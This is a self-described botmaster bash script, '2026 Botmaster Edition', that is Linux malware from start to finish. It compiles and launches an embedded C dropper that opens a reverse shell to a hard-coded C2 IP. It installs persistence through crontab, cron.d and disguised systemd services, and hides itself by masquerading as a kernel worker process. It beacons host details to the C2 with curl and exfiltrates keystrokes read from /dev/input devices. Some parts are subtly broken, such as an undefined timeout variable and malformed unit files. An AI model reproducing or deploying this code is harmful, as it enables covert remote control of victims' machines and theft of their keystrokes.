#!/usr/bin/env bash
# SleepTheGod @portknock Alpharetta Eternal One-File Nuke – 2026 Botmaster Edition
# Fully automated: persistence, dropper.c compile&run, beacon, key exfil, QEMU detection

set -euo pipefail 2>/dev/null || true

C2_HOST="173.249.20.58"
C2_PORT="443"
C2_PATH="/beacon"
SHELL_PORT="4445"
SELF="/usr/lib/.private-systemd-sync"
FAKE_SVC="systemd-journal-remote-cache"
FAKE_PROC="[kworker/0:1H-events_freezable]"
INTERVAL=11
KEY_TO=0.3
DROP_BIN="/tmp/.x11-tmp"
DROP_SRC="/tmp/.x11-tmp.c"

# ─── EMBEDDED DROPPER.C ────────────────────────────────────────
dropper_code() {
cat > "$DROP_SRC" <<'EOD'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>

#define IP   "173.249.20.58"
#define PORT 4445
#define NAME "[kworker/u8:2-flush-8:0]"

int main() {
    prctl(PR_SET_NAME, NAME, 0, 0, 0);
    if (fork()) exit(0);
    setsid();
    if (fork()) exit(0);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = { .sin_family=AF_INET, .sin_port=htons(PORT) };
    inet_pton(AF_INET, IP, &a.sin_addr);

    if (connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {
        dup2(s,0); dup2(s,1); dup2(s,2);
        char *sh[]={"/bin/sh",NULL};
        execve(sh[0],sh,NULL);
    }

    FILE *f=fopen("/etc/ld.so.preload","w");
    if (f) { fprintf(f,"%s\n",__FILE__); fclose(f); }

    while(1) sleep(666);
}
EOD
}

# ─── QEMU DETECTION ────────────────────────────────────────────
qemu() { dmesg|grep -qi "QEMU\|SeaBIOS\|virtio"; }

# ─── HIDE ──────────────────────────────────────────────────────
cloak() {
    echo -n "$FAKE_PROC" >/proc/$$/cmdline 2>/dev/null
    prctl PR_SET_NAME "$FAKE_PROC" 2>/dev/null
}

# ─── PERSISTENCE APOCALYPSE ────────────────────────────────────
infect() {
    [ "$0" = "$SELF" ] && return
    mkdir -p "$(dirname "$SELF")" 2>/dev/null
    cp "$0" "$SELF" 2>/dev/null
    chmod 755 "$SELF" 2>/dev/null

    (crontab -l 2>/dev/null; echo "@reboot root $SELF >/dev/null 2>&1")|crontab - 2>/dev/null
    echo "@reboot root $SELF >/dev/null 2>&1" >"/etc/cron.d/.${FAKE_SVC}-$(uuidgen|cut -c1-8)" 2>/dev/null

    if [ "$(id -u)" = "0" ]; then
        cat >"/etc/systemd/system/${FAKE_SVC}.service" <<EOF
[Unit]Description=Journal Remote Cache
[Service]ExecStart=$SELF Restart=always RestartSec=5
[Install]WantedBy=multi-user.target
EOF
        systemctl daemon-reload && systemctl enable --now "${FAKE_SVC}" 2>/dev/null
    fi

    mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
    cat >"$HOME/.config/systemd/user/${FAKE_SVC}.service" <<EOF
[Unit]Description=Journal Forwarder
[Service]ExecStart=$SELF Restart=always RestartSec=11
[Install]WantedBy=default.target
EOF
    systemctl --user daemon-reload && systemctl --user enable --now "${FAKE_SVC}.service" 2>/dev/null

    dropper_code
    if command -v gcc >/dev/null 2>&1; then
        gcc -static -s -O2 -fno-stack-protector -o "$DROP_BIN" "$DROP_SRC" 2>/dev/null && {
            rm -f "$DROP_SRC"
            chmod +x "$DROP_BIN"
            "$DROP_BIN" & disown 2>/dev/null
        }
    fi

    exec "$SELF" "$@" &
    exit 0
}

# ─── BEACON + EXEC ─────────────────────────────────────────────
beacon() {
    local p="$(whoami)@$(hostname) [$(date '+%Y-%m-%d %H:%M:%S')] PID=$$ $(qemu && echo QEMU)"
    curl -skm 8 --data-urlencode "q=$p" "https://$C2_HOST:$C2_PORT$C2_PATH" 2>/dev/null
}

# ─── KEY SNIFF ─────────────────────────────────────────────────
keys() {
    [ "$(id -u)" != "0" ] || ! qemu && return
    for d in /dev/input/event{0..9}; do
        timeout "$KEY_TIMEOUT" cat "$d" 2>/dev/null | base64 -w0 | \
            curl -sk --data-binary @- "https://$C2_HOST:$C2_PORT$C2_PATH" >/dev/null 2>&1 &
    done
}

# ─── MAIN ──────────────────────────────────────────────────────
main() {
    [ -t 0 ] && exec </dev/null >/dev/null 2>&1
    cloak
    infect
    while true; do
        beacon
        keys
        sleep $((INTERVAL + RANDOM%7))
    done
}

main "$@"
